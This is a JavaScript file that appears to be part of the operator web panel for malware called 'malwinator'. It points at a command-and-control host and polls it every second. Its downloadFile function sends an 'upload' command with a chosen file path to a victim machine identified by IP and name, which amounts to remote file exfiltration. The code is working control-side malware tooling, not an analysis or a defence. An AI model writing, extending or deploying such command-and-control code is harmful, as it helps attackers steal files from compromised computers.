// uri = "http://localhost:5000"
uri = "https://malwinator.chickenkiller.com"
// uri = "http://malwinator.chickenkiller.com"

setInterval(function() {fetchResult('download');}, 1000);

function downloadFile(){
  var path = document.getElementById('path').value;
  var resultDisplay = document.getElementById("uploadResult");
  
  if(path == ''){
    resultDisplay.textContent = "No path!";
  }
  else {
    const formData = new FormData();
    
    const command = 'upload \"' + path + '\"';

    console.log(command);

    formData.append("ip", ip);
    formData.append("name", name);
    formData.append("command", command);

    fetch(uri + "/send", {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            if (text == '1')
              resultDisplay.textContent = "Command not sent!";
            else 
              resultDisplay.textContent = "Command sent succesfully!";
        })
        .catch(error => {
            console.error('Error', error);
        })
  }
}